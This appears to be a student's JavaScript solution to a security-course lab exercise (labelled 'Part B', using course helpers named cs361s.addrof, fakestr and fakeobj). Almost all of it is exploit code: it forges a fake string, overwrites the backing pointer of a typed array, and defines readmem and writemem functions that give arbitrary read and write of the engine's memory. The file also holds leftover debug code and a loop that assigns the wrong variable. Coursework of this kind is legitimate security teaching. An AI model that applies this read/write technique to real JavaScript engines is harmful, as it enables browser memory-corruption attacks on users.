/*
 * TODO: Part B solution goes here!
 */
let dataPlane = new Uint32Array(1);
let fakestring = cs361s.fakestr(cs361s.addrof("\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00") + 16);

let heapArray = new Uint32Array(72);
while (cs361s.addrof(heapArray) < cs361s.addrof(fakestring) || cs361s.addrof(heapArray) > cs361s.addrof(fakestring) - 72 + 16 + 10000000) {
    array = new Uint32Array(72);
}
let testing = function(){
    print('Test');
    print(cs361s.addrof(fakestring));
    print(cs361s.addrof(fakestring) - 56);
    print(cs361s.addrof(fakestring) - 56 + (2 ** 28));
};
let offset = cs361s.addrof(heapArray) - (cs361s.addrof(fakestring) + 16);
let codes = new Uint8Array(72);

var index = 0;
while(index < codes.length){
    codes[index] = fakestring.charCodeAt(offset + index);
    index++;
}


var fb = 0;
while(fb < 8) {
    var bit = 0;
    let temp = cs361s.addrof(dataPlane);
    while(bit < fb) {
        temp = (temp - codes[72 - 16 + bit])/256;
        bit++;
    }   
    codes[72 - 16 + fb] = temp % 256;
    fb++;
}

/*
// write the bytes we want into the data plane
for (var i = 0; i < 8; i++) {
    let temp = cs361s.addrof(dataPlane);
    for (var k = 0; k < i; k++) {
        temp = temp - bytes[56 + k];
        temp = temp / 256;
    }
    bytes[56 + i] = temp % 256;
}
*/

// create the control plane
codes[0] = codes[0] + 1;
let cBuf = String.fromCharCode(...codes);
let controlPlane = cs361s.fakeobj(cs361s.addrof(cBuf) + 16);

let words = 2 ** 32;

let readmem = function(addr) {
    controlPlane[14] = addr % words;
    controlPlane[15] = (addr - controlPlane[0]) / words;
    return dataPlane[0];
};

let writemem = function(addr, val) {
    controlPlane[14] = addr % words;
    controlPlane[15] = (addr - controlPlane[0]) / words;
    dataPlane[0] = val;
};
